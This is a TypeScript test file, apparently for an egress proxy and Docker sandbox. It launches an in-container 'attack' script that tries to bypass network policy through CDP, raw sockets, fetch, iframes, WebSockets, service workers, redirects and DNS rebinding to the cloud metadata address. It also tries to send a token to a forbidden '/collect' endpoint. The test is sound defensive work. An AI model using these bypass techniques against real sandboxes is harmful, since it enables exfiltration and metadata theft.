import { spawn } from "node:child_process";
import { randomUUID } from "node:crypto";
import { once } from "node:events";
import { mkdir, mkdtemp, readFile, rm, writeFile } from "node:fs/promises";
import { createServer } from "node:http";
import { tmpdir } from "node:os";
import { join, resolve } from "node:path";
import { expect, it } from "vitest";
import { startShop } from "../../../../fixtures/reference-shop/src/index.js";
import { EgressPolicy } from "../egress/policy.js";
import { EgressProxy } from "../egress/proxy.js";
import { readImageLock } from "../images/lock.js";
import { DockerExecutor } from "./executor.js";

it("browser/CDP/broker, worker, redirects, iframe and reconnect bypasses produce only approved packets", async () => {
  const directory = await mkdtemp(join(tmpdir(), "tm-egress-adv-"));
  const shop = await startShop();
  let forbiddenRequests = 0;
  let forbiddenUpgrades = 0;
  const forbidden = createServer((_request, response) => {
    forbiddenRequests++;
    response.end("forbidden-controller");
  });
  forbidden.on("upgrade", (_request, socket) => {
    forbiddenUpgrades++;
    socket.destroy();
  });
  const listening = Promise.withResolvers<void>();
  forbidden.listen(0, "127.0.0.1", listening.resolve);
  await listening.promise;
  const address = forbidden.address();
  if (!address || typeof address === "string") throw new Error("address");
  const forbiddenUrl = `http://127.0.0.1:${address.port}`;
  const approvedPort = Number(new URL(shop.url).port);
  const inputDir = join(directory, "input");
  const socketsDir = join(directory, "sockets");
  await mkdir(inputDir);
  await mkdir(socketsDir);
  const logPath = join(directory, "egress.ndjson");
  let resolutions = 0;
  const rebound = `http://rebind.test:${approvedPort}`;
  const proxy = new EgressProxy({
    socketPath: join(socketsDir, "egress.sock"),
    logPath,
    policy: new EgressPolicy(
      {
        defaultAction: "deny",
        allowedOrigins: [shop.url, rebound],
        privateTargets: [{ hostname: "rebind.test", cidr: "127.0.0.1/32", port: approvedPort }],
        allowedProtocols: ["http", "https"],
        allowRedirects: true,
        maxRedirects: 10,
        allowInsecureTls: false,
      },
      {
        networkProfile: "local-loopback",
        baseUrl: shop.url,
        host: "127.0.0.1",
        port: approvedPort,
      },
    ),
    // There is no DNS cache: every fresh socket sees the resolver's current answer.
    resolver: async () => (++resolutions <= 2 ? ["127.0.0.1"] : ["169.254.169.254"]),
  });
  const capturePath = join(directory, "capture.pcap");
  const capture = spawn(
    "sudo",
    [
      "-n",
      "tcpdump",
      "-U",
      "--immediate-mode",
      "-i",
      "lo",
      "-w",
      capturePath,
      `tcp and (port ${approvedPort} or port ${address.port})`,
    ],
    { stdio: ["ignore", "pipe", "pipe"] },
  );
  const ready = Promise.withResolvers<void>();
  capture.stderr.on("data", (bytes: Buffer) => {
    if (bytes.toString().includes("listening on")) ready.resolve();
  });
  capture.once("error", ready.reject);
  capture.once("close", () => ready.reject(new Error("Packet capture unavailable")));
  try {
    await ready.promise;
    await proxy.listen();
    const script = `import assert from 'node:assert/strict'; import {connect} from 'node:net'; import {createRequire} from 'node:module';
import {chromium} from '/opt/testmaster/runner/node_modules/playwright-core/index.mjs';
const {ProxyAgent,request}=createRequire('/opt/testmaster/runner/package.json')('undici');
const gateway=new ProxyAgent('http://127.0.0.1:3128');
for(let index=0;index<4;index++) {const result=await request(${JSON.stringify(`${rebound}/health`)},{dispatcher:gateway}); assert.equal(result.statusCode,index<2?200:403); await result.body.dump();}
const browser=await chromium.launch({headless:true,chromiumSandbox:true,proxy:{server:'http://127.0.0.1:3128',bypass:'<-loopback>'}});
const context=await browser.newContext({serviceWorkers:'allow'}); const page=await context.newPage();
await page.goto(${JSON.stringify(`${shop.url}/adversarial/none`)}); assert.equal(await page.locator('[data-testid=fixture]').innerText(),'Adversarial fixture');
const denied=${JSON.stringify(forbiddenUrl)};
await assert.rejects(chromium.connectOverCDP(denied+'/json/version',{timeout:2000}));
await assert.rejects(new Promise((resolve,reject)=>{const socket=connect({host:'127.0.0.1',port:${address.port}});socket.once('error',reject);socket.once('connect',()=>{socket.destroy();resolve()})}));
for(const mode of ['fetch','iframe','websocket','worker']) {
 await page.goto(${JSON.stringify(shop.url)}+'/adversarial/'+mode+'?target='+encodeURIComponent(denied+'/collect?token=iframe-token'));
 if(mode==='worker') await page.evaluate(async()=>{await navigator.serviceWorker.ready; await navigator.serviceWorker.getRegistration().then(r=>r.unregister())});
 else await page.evaluate(async(target)=>{for(let i=0;i<2;i++) await new Promise(resolve=>{const socket=new WebSocket(target.replace(/^http/,'ws')+'/reconnect');socket.onerror=()=>resolve();socket.onclose=()=>resolve()})},denied);
 await page.evaluate(async(target)=>{for(let i=0;i<2;i++) await new Promise(resolve=>{const socket=new WebSocket(target.replace(/^http/,'ws')+'/dns-reconnect');socket.onerror=()=>resolve();socket.onclose=()=>resolve()})},${JSON.stringify(rebound)});
}
for(const mode of ['js','meta']) {await page.goto(${JSON.stringify(shop.url)}+'/adversarial/'+mode+'?target='+encodeURIComponent(denied+'/redirect')).catch(()=>{}); await page.waitForURL(denied+'/**');}
await page.goto(${JSON.stringify(`${shop.url}/adversarial/none`)});
const cdp=await context.newCDPSession(page); await cdp.send('Network.enable'); await cdp.send('Network.setBypassServiceWorker',{bypass:true});
await page.evaluate(async(target)=>{const r=await fetch(target+'/broker',{mode:'no-cors'}).catch(()=>null);return r},denied);
await cdp.detach(); await browser.close(); await gateway.close(); console.log('browser-network-denials-complete');`;
    await writeFile(join(inputDir, "attack.mjs"), script);
    const lock = await readImageLock(resolve("containers/images.lock.json"));
    const result = await new DockerExecutor().execute({
      attemptId: `att_${randomUUID()}`,
      runId: `run_${randomUUID()}`,
      kind: "browser",
      imageId: lock["testmaster-runner"].imageId,
      inputDir,
      socketsDir,
      seccompPath: resolve("containers/seccomp_profile.json"),
      entrypoint: ["node", "/opt/testmaster/runner/dist/forwarder/tooling.js"],
      command: ["node", "/run/testmaster/input/attack.mjs"],
      attemptTimeoutMs: 40000,
    });
    expect(result.code, result.stderr.toString()).toBe(0);
    expect(result.stdout.toString()).toContain("browser-network-denials-complete");
    // Four HTTP sockets plus eight WebSocket reconnects independently resolve DNS.
    expect(resolutions).toBe(12);
    expect(forbiddenRequests).toBe(0);
    expect(forbiddenUpgrades).toBe(0);
    await proxy.close();
    const closed = once(capture, "close");
    capture.kill("SIGINT");
    await closed;
    const decoded = spawn("sudo", ["-n", "tcpdump", "-nn", "-r", capturePath], {
      stdio: ["ignore", "pipe", "pipe"],
    });
    const packets: Buffer[] = [];
    decoded.stdout.on("data", (bytes: Buffer) => packets.push(bytes));
    await once(decoded, "close");
    const observed = Buffer.concat(packets).toString();
    expect(observed).toContain(`127.0.0.1.${approvedPort}`);
    expect(observed).not.toContain(`127.0.0.1.${address.port}`);
    const decisions = (await readFile(logPath, "utf8"))
      .trim()
      .split("\n")
      .map((line) => JSON.parse(line));
    expect(
      decisions.some((event) => event.decision === "allow" && event.pinnedIp === "127.0.0.1"),
    ).toBe(true);
    expect(decisions.some((event) => event.reason === "address_denied:metadata")).toBe(true);
    expect(decisions.some((event) => event.reason === "origin_denied")).toBe(true);
    expect(await readFile(logPath, "utf8")).not.toContain("iframe-token");
  } finally {
    capture.kill("SIGINT");
    await proxy.close().catch(() => {});
    await shop.close();
    const closed = Promise.withResolvers<void>();
    forbidden.close(closed.resolve);
    await closed.promise;
    await rm(directory, { recursive: true, force: true });
  }
}, 90000);
